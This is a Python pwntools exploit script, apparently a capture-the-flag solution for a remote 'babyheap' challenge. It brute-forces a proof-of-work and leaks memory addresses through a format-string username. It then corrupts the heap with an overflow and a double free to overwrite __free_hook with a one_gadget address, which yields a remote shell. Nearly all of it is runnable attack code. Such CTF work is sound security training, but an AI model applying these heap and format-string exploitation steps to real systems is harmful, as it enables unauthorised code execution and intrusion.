from pwn import *
from hashlib import sha256
from hashlib import md5

#Edited slightly for better readability, during the race I was not concerned about reading it later but before it looked gross


#p = process('./SEC760-babyheap')
p = remote('babyheap.deadlisting.com',5760)

t = p.read().split('= ')[1][:6]

alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"

string = ""
correct = 0
for x in alphabet:
    for y in alphabet:
        for z in alphabet:
            for w in alphabet:
                m = sha256()
                m.update(x+y+z+w)
                s= m.digest().encode('hex')[-6:]
                if t == s:
                    string = x+y+z+w
                    correct = 1
                    break
            if correct:
                break
        if correct:
            break
    if correct:
        break


def a(b,c):
    p.sendlineafter(b,c)

def create(size, data):
    a('>','3')
    a(':',str(size))
    a(':',data)

def delete(index):
    a('>','4')
    a(':',str(index))

print "string = ", string

#login
p.sendline(string)
a('>','1')
username = "%p %p%p%p%p%p%p%p%p %p"
a(':',username)
md = md5()
md.update(username)
password = md.digest().encode('hex')
print password
print username
a(':',password)

#leak

a('>','2')
p.readuntil('= ')
leaks = p.readuntil('\n+')[:-2].split()
print leaks
free_hook = int(leaks[0],16)
base = free_hook-0x1e75a8
one_gadget = base+0x106ef8
base = int(leaks[2],16)-0xa74

print "Creating"
#create 
create(24,'a')
create(0x108,'b')
create(0xf8,'c')

print "Deleting"
#delete
for x in range(3):
    delete(x)

print "Overwriting"
#overwrite
create(24,'a'*24)

print "DoubleFree"
#doublefree
delete(1)

print "Create 1st"
#create 1st
create(0x108,p64(free_hook))

print "Create 2nd"
#create second
create(0xf8,'a')

print "Allocate free_hook"
#allocate free_hook
create(0xf8,p64(one_gadget))

print "Get Shell"
#get shell
delete(2)

p.sendline('ls')

print "Enjoy"
#gdb.attach(p)
p.interactive()

p.close()
